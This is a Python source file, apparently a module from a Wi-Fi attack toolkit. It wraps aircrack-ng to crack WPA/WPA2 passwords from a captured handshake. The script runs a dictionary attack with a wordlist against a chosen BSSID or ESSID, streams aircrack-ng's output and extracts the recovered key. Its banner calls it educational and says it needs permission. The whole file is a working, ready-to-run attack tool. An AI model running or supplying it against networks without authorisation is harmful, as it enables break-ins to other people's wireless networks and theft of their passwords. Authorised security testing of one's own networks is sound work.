# modules/brute_force_cracker.py (or any other name)

import subprocess
import os
import sys
import shutil # For shutil.which
import argparse
import re

# --- Configuration ---
AIRCRACK_COMMAND = "aircrack-ng"
# ---------------------

def is_tool_installed(name):
    """Check whether `name` is on PATH and marked as executable."""
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it first.")
        return False
    return True

def brute_force_crack(handshake_file, wordlist, bssid=None, essid=None):
    """
    Brute-force attack on WPA/WPA2 handshake using aircrack-ng.

    :param handshake_file: Path to the captured handshake file (e.g., .cap, .pcap, .hccapx).
    :param wordlist: Path to the wordlist file.
    :param bssid: (Optional) BSSID (MAC address) of the target AP.
    :param essid: (Optional) ESSID (Network Name) of the target AP.
    :return: The found password as a string, or None if not found or an error occurred.
    """
    print(f"[*] Preparing brute-force attack on '{handshake_file}' using wordlist '{wordlist}'...")

    if not is_tool_installed(AIRCRACK_COMMAND):
        return None

    if not os.path.isfile(handshake_file):
        print(f"[!] Error: Handshake file not found: {handshake_file}")
        return None

    if not os.path.isfile(wordlist):
        print(f"[!] Error: Wordlist file not found: {wordlist}")
        return None

    command = [AIRCRACK_COMMAND]

    # Add BSSID or ESSID if provided (helps aircrack-ng select the right network)
    if bssid:
        command.extend(["-b", bssid])
        print(f"[*] Targeting BSSID: {bssid}")
    elif essid: # Only use ESSID if BSSID is not given, BSSID is more specific
        command.extend(["-e", essid])
        print(f"[*] Targeting ESSID: {essid}")
    else:
        print("[!] Warning: No BSSID or ESSID specified. Aircrack-ng will try to crack all networks in the .cap file.")
        print("           Consider providing a BSSID (-b) or ESSID (-e) for better accuracy and speed.")


    command.extend([handshake_file, "-w", wordlist])

    print(f"[+] Executing: {' '.join(command)}")
    print("[+] Aircrack-ng will now run. This may take a very long time depending on the wordlist size and password complexity.")
    print("[+] Press Ctrl+C in this window to attempt to stop aircrack-ng (it might take a moment to respond).")

    try:
        # Using Popen for better control over interactive processes,
        # though for aircrack-ng with -w, it's less interactive.
        # We capture stdout to parse it. stderr is also captured.
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

        found_password = None
        key_found_line = ""

        # Stream output to find the key as soon as it's printed
        # Aircrack-ng prints progress, then "KEY FOUND!" if successful.
        for line in iter(process.stdout.readline, ''):
            sys.stdout.write(line) # Print aircrack-ng's output in real-time
            sys.stdout.flush()
            if "KEY FOUND!" in line:
                key_found_line = line # Store the line
                # We can try to extract more lines if the password is on the next line
                # or in subsequent details. For now, assume it's on this line or very close.
                # Aircrack-ng usually prints it like: "KEY FOUND! [ <password> ]"
                # Or for WPA2: "KEY FOUND! [ XX:XX:XX:XX:XX:XX ] (ASCII: <password>)"
                break # Key found, no need to process more stdout for the key itself

        process.stdout.close() # Allow process to receive SIGPIPE if it hadn't terminated
        return_code = process.wait() # Wait for the process to complete

        if key_found_line:
            print("\n[+] Password Potentially Found!")
            # Regex to find "KEY FOUND! [ password ]" or "KEY FOUND! [ XX:XX... ] (ASCII: password)"
            # It might also just be the password after "KEY FOUND! [ "
            match = re.search(r"KEY FOUND! \[ (.*?) \]", key_found_line, re.IGNORECASE)
            if match:
                potential_pw = match.group(1).strip()
                # If it's in the format (ASCII: actual_password), extract that
                ascii_match = re.search(r"\(ASCII:\s*(.+?)\)", potential_pw, re.IGNORECASE)
                if ascii_match:
                    found_password = ascii_match.group(1).strip()
                else: # Otherwise, assume the content inside [] is the password
                    found_password = potential_pw

            if found_password:
                print(f"\033[92m[SUCCESS] Password: {found_password}\033[0m") # Green text for success
                return found_password
            else:
                print("[-] 'KEY FOUND!' detected, but could not parse the password from the line:")
                print(f"    '{key_found_line.strip()}'")
                print("[-] Please check aircrack-ng's full output above manually.")
                return None # Or return key_found_line for manual inspection

        # If loop finished and key_found_line is empty
        if not found_password:
            if return_code == 0: # Aircrack-ng exited normally but no key found
                print("\n[-] Password not found in the provided wordlist (aircrack-ng finished).")
            else: # Aircrack-ng exited with an error
                print(f"\n[-] Aircrack-ng exited with error code {return_code}.")
                stderr_output = process.stderr.read()
                if stderr_output:
                    print("[-] Error Output (stderr):")
                    print(stderr_output.strip())
            return None

    except subprocess.CalledProcessError as e: # Should not happen with Popen like this
        print(f"[-] Error occurred during brute-force (CalledProcessError): {e}")
        if e.stderr:
            print(f"[-] Stderr: {e.stderr}")
        return None
    except FileNotFoundError:
        print(f"[!] Error: '{AIRCRACK_COMMAND}' (or sudo) not found. Ensure it's installed and in your PATH.")
        return None
    except KeyboardInterrupt:
        print("\n[!] Brute-force attack interrupted by user (Ctrl+C).")
        # process.terminate() # Send SIGTERM
        # process.wait(timeout=5) # Wait a bit
        # if process.poll() is None: # If still running
        #     process.kill() # Send SIGKILL
        # print("[!] Aircrack-ng process terminated.")
        return None # Or raise
    except Exception as e:
        print(f"[-] An unexpected error occurred: {str(e)}")
        return None
    finally:
        # Ensure process is cleaned up if Popen was used and an exception occurred before wait()
        if 'process' in locals() and process.poll() is None:
            print("[!] Cleaning up aircrack-ng process...")
            process.terminate()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
            print("[!] Aircrack-ng process terminated.")


def main():
    parser = argparse.ArgumentParser(
        description="Brute-force WPA/WPA2 handshake files using aircrack-ng.",
        epilog="Example: python3 %(prog)s captured.cap /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55"
    )
    parser.add_argument("handshake_file", help="Path to the captured handshake file (.cap, .pcap, etc.)")
    parser.add_argument("wordlist", help="Path to the wordlist file.")
    parser.add_argument("-b", "--bssid", help="BSSID (MAC address) of the target Access Point (e.g., 00:11:22:AA:BB:CC).")
    parser.add_argument("-e", "--essid", help="ESSID (Network Name) of the target Access Point.")
    # parser.add_argument("-t", "--threads", type=int, help="Number of threads/CPUs to use (passed to aircrack-ng if supported via specific options). Aircrack-ng handles CPU usage automatically but some versions might have flags.")

    args = parser.parse_args()

    print("=======================================================")
    print("          WPA/WPA2 Handshake Brute-Force Tool          ")
    print("=======================================================")
    print("Disclaimer: This script is for educational purposes only.")
    print("Ensure you have explicit permission before testing on any network or file.")
    print("Unauthorized cracking is illegal.")
    print("=======================================================\n")


    found_password = brute_force_crack(args.handshake_file, args.wordlist, args.bssid, args.essid)

    if found_password:
        print(f"\n[+] Attack finished. Password recovered: {found_password}")
    else:
        print("\n[-] Attack finished. Password not recovered or an error occurred.")

if __name__ == "__main__":
    main()